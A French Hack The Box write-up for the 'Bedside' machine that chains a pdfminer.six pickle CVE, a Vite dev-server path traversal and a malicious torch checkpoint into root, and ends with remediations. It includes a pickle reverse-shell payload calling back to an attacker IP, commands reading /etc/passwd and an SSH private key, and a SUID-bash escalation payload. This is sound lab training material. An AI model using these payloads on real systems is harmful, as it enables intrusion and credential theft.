# HTB — Bedside · Write-up complet

> **Difficulté** : Medium (Linux) · **Thème** : portail de recherche médicale
> **Résumé** : Recon vhost → RCE via CVE pdfminer.six (pickle) → shell container → LFI serveur de dev Vite (arbitrary file read) → vol de clé SSH → user → sudo trainer + checkpoint pickle malveillant → root.

> ⚠️ **Note communauté HTB** : ne publiez un write-up détaillé qu'**après le retrait de la box**. Respectez la politique de disclosure.

> 🔑 **Note secrets** : la clé SSH capturée est remplacée par un placeholder dans ce dépôt public (bonne pratique — GitHub scanne les secrets, et on ne publie jamais de clé en clair).

---

## Sommaire
1. [Reconnaissance]
2. [Énumération web]
3. [Foothold — CVE pdfminer.six]
4. [Exploration du container]
5. [Pivot — service interne (port 3000)]
6. [User — LFI Vite + clé SSH]
7. [Root — sudo trainer + pickle]
8. [Résumé de l'attack path]
9. [Remédiations]

---

## 1. Reconnaissance

### Setup
```bash
echo "10.129.X.X  bedside.htb" | sudo tee -a /etc/hosts
mkdir -p Bedside/{nmap,loot,exploits} && cd Bedside
```

### Scan de ports
```bash
# Full port scan
nmap -p- --min-rate 5000 -oA nmap/allports 10.129.X.X

# Scripts + versions
nmap -sC -sV -oA nmap/initial 10.129.X.X
```

**Résultat :**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 10.0p2 Debian 13 |
| 80 | HTTP | Apache 2.4.68 — "Bedside Clinic" |
| 3000 | filtered | interne uniquement |

**Clés :** le titre HTTP donne le domaine `bedside.htb` ; le **port 3000 filtered** est un service interne — cible probable une fois à l'intérieur.

---

## 2. Énumération web

### Fuzzing de virtual hosts
Le port 80 sert un site statique. On cherche des vhosts :

```bash
curl -s http://bedside.htb | wc -c   # taille de référence

ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.X.X \
  -H "Host: FUZZ.bedside.htb" \
  -fs 0 -mc all
```

→ `research.bedside.htb` répond `200` là où tout le reste fait `301`.

```bash
echo "10.129.X.X  research.bedside.htb" | sudo tee -a /etc/hosts
```

### Analyse du portail
```bash
curl -s http://research.bedside.htb | head -80
whatweb http://research.bedside.htb
```

**Découvertes :**
- **Portail d'upload** de fichiers médicaux.
- Header **`X-Powered-By: pdfminer.six`** → les PDF sont parsés côté serveur.
- Mention **"Collections can be uploaded as archives"** → extraction d'archives.

### Fingerprinting du filtre
Un fichier hors format renvoie un message qui **fuite la vraie liste d'extensions** :
```
Invalid file type. Allowed: jpeg, jpg, png, bmp, tiff, dcm, pdf, gz, zip
```
→ `gz`/`zip` acceptés (cachés). Le message d'erreur MIME fuite aussi le **webroot** : `/var/www/research.bedside.htb/uploads`.

```bash
# feroxbuster : révèle /uploads/ et index.php
feroxbuster -u http://research.bedside.htb -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip
# Fichiers stockés sans renommage, servables en HTTP
curl -s -o /dev/null -w "%{http_code}\n" http://research.bedside.htb/uploads/test.pdf   # → 200
```

Le webshell direct (`.php`, `.phtml`, double extension) est bloqué par un filtre **extension + MIME**.

---

## 3. Foothold — CVE pdfminer.six

Version confirmée (via `requirements.txt` plus tard) : **`pdfminer.six==20250506`**.

> **CVE-2025-64512** — Exécution de code arbitraire via un PDF malveillant.
> Le parsing d'un `/Encoding` CMap force pdfminer à charger un fichier pickle gzippé depuis un chemin contrôlé, dont la désérialisation exécute du code.

**Prérequis (satisfaits ici) :**
1. Écrire un pickle à un **chemin connu** → uploads accepte `.gz`.
2. Référencer ce chemin dans le `/Encoding` d'un PDF.

### Étape 1 — Pickle (reverse shell)
```python
# make_pickle.py
import pickle, gzip, os
class Evil:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/<TON_IP>/4444 0>&1'"
        return (os.system, (cmd,))
with gzip.open("shell.pickle.gz", "wb") as f:
    pickle.dump(Evil(), f)
```
```bash
python3 make_pickle.py
curl -s -F "uploadFile=@shell.pickle.gz" http://research.bedside.htb | grep -i message
```

### Étape 2 — PDF déclencheur
Champ clé (`#2F` = `/`) :
```
/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fshell
```
→ résout `/var/www/research.bedside.htb/uploads/shell.pickle.gz`.

Structure PDF minimale (objet Font 5 0 obj portant le `/Encoding` ci-dessus) — voir `trigger.pdf` dans le dépôt.

### Étape 3 — Déclenchement
```bash
nc -lvnp 4444   # ou penelope -p 4444
curl -s -F "uploadFile=@trigger.pdf" http://research.bedside.htb | grep -i message
```
→ **Shell** en tant que `datawrangler` sur le container `data-wrangler`. Worker : `/app/pdf_watcher.py` (poll toutes les 30s).

```bash
# stabilisation
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm   # Ctrl+Z ; stty raw -echo ; fg
```

---

## 4. Exploration du container

```bash
id                    # uid=988(datawrangler) gid=1001(dataops)
ls -la /.dockerenv    # container Docker confirmé
grep Cap /proc/self/status   # CapEff=0 → non-privilégié, pas d'évasion directe
```

```bash
mount | grep -i datastore
# /dev/sda4 on /datastore type ext4 (rw)
```
- `/datastore` et `uploads` sont des **bind mounts depuis sda4** (partagé avec l'hôte).
- Groupe `dataops` **writable** sur `/datastore/{staging,processed,checkpoints,...}`.
- `/tmp/portscan.sh` pré-présent (indice) ; le container partage la stack réseau de l'hôte.

---

## 5. Pivot — service interne (port 3000)

```bash
/tmp/portscan.sh 127.0.0.1     # → 22, 80, 3000
curl -s http://127.0.0.1:3000/ | head -40
```
→ appli **"Image Viewer"** (React) servie par un **serveur de dev Vite** (marqueurs HMR `/@hmr`, `esm.sh/x`). Le `fetchSlices()` est un stub → la faille est dans **Vite** lui-même.

Forward optionnel vers ta machine :
```bash
# attaquant : chisel server -p 8888 --reverse
# container : ./chisel client <TON_IP>:8888 R:3000:127.0.0.1:3000
```

---

## 6. User — LFI Vite + clé SSH

Serveur de dev Vite exposé → **arbitrary file read** via traversal relatif :

```bash
curl -s --path-as-is "http://127.0.0.1:3000/../../../../etc/passwd"
```
> `--path-as-is` empêche curl de normaliser les `../`.

Utilisateur cible : `developer` (uid 1000). Vol de la clé + flag :
```bash
curl -s --path-as-is "http://127.0.0.1:3000/../../../../home/developer/.ssh/id_rsa"
curl -s --path-as-is "http://127.0.0.1:3000/../../../../home/developer/user.txt"
```

### Connexion SSH
```bash
cat > developer_key << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
[... CLÉ PRIVÉE — retirée du dépôt public (placeholder).
     Récupérez la vôtre via l'étape LFI ci-dessus ...]
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 developer_key
ssh -i developer_key developer@10.129.X.X
cat ~/user.txt   # ✅ USER
```

---

## 7. Root — sudo trainer + pickle

```bash
sudo -l
# (ALL) NOPASSWD: /usr/bin/python3 /opt/trainer/bedside_trainer.py
```
> ⚠️ La règle matche **uniquement la commande exacte sans arguments**.

### Analyse du script
`cat /opt/trainer/bedside_trainer.py` — comportement (en **root**) :
1. Remplit un dataloader depuis `/datastore/processed` (images valides requises).
2. `find_latest_checkpoint()` → prend le `.pt` le plus récent dans `/datastore/checkpoints`.
3. `CheckpointLoader` → **`torch.load()`** → désérialisation **pickle**.

→ On contrôle le `.pt` = RCE root. `/datastore/checkpoints` est **writable par `dataops`**.

### Détail crucial : version de torch
```bash
python3 -c "import torch; print(torch.__version__)"   # → 2.5.0+cpu
```
torch **< 2.6** → `weights_only=False` par défaut → **pickle arbitraire autorisé**. ✅
(torch absent du container → forger le `.pt` sur l'hôte.)

### Contraintes d'environnement
| Contrainte | Solution |
|-----------|----------|
| `developer` pas dans `dataops` | placer le `.pt` **via le container** |
| torch absent du container | forger sur l'**hôte**, transférer via HTTP local |
| `/tmp` monté **nosuid** | cibler **`/var/tmp`** (sur `/`) |
| Reader MONAI plante sur `.txt` | mettre un **PNG valide** dans `processed/` |

### Exploitation
```bash
# 1. HÔTE (developer) : forger le checkpoint
cat > /tmp/mkckpt.py << 'PYEOF'
import torch, os
class Evil:
    def __reduce__(self):
        return (os.system, ("cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash",))
torch.save({"model": Evil()}, "/tmp/checkpoint_epoch_999.pt")
PYEOF
python3 /tmp/mkckpt.py
cd /tmp && python3 -m http.server 9001

# 2. CONTAINER (dataops) : placer le checkpoint + image valide
curl http://127.0.0.1:9001/checkpoint_epoch_999.pt -o /datastore/checkpoints/checkpoint_epoch_999.pt
touch /datastore/checkpoints/checkpoint_epoch_999.pt
rm -f /datastore/processed/*.txt
# déposer un PNG valide dans /datastore/processed/

# 3. HÔTE : déclencher (commande EXACTE sans arguments)
sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py

# 4. Root
/var/tmp/rootbash -p
id && cat /root/root.txt   # ✅ ROOT
```

> L'erreur `TypeError: Expected state_dict... got <class 'int'>` est **cosmétique** : `os.system` s'exécute pendant le unpickle, avant que MONAI touche au résultat.

---

## 8. Résumé de l'attack path

```
1. Recon           → vhost research.bedside.htb (portail d'upload)
2. Fingerprint     → pdfminer.six + extensions gz/zip cachées
3. Foothold        → CVE-2025-64512 : PDF malveillant + pickle.gz → shell container
4. Enum container  → bind mounts /datastore (sda4), groupe dataops writable
5. Pivot           → port 3000 local = serveur de dev Vite
6. User            → LFI Vite → vol id_rsa developer → SSH → user.txt
7. Root            → sudo trainer.py → checkpoint pickle (torch 2.5) écrit via
                     le container → torch.load = RCE root → SUID bash /var/tmp → root.txt
```

**Fil rouge :** la **désérialisation pickle** apparaît **deux fois** (pdfminer, torch.load), et l'**architecture container/hôte partageant `/datastore`** rend l'escalade finale possible.

---

## 9. Remédiations

| Vulnérabilité | Correctif |
|---------------|-----------|
| CVE pdfminer.six | Mettre à jour (`>= 20251107`) ; sandboxer le parsing. |
| Extensions cachées | Valider type par contenu **et** extension ; extraction anti-Zip-Slip. |
| Serveur de dev Vite exposé | Jamais en prod ; build statique + reverse proxy ; restreindre `server.fs`. |
| Clé SSH lisible | Permissions strictes ; ne pas exposer les homes via un service. |
| sudo trainer + pickle | `weights_only=True` (torch ≥ 2.6) ; signer les checkpoints ; restreindre l'écriture. |
| `/datastore` partagé | Isoler les volumes ; moindre privilège sur `dataops`. |
| `/tmp nosuid` | Étendre nosuid/noexec à `/var/tmp` et `/dev/shm`. |

---

*Write-up éducatif — HTB Bedside.*
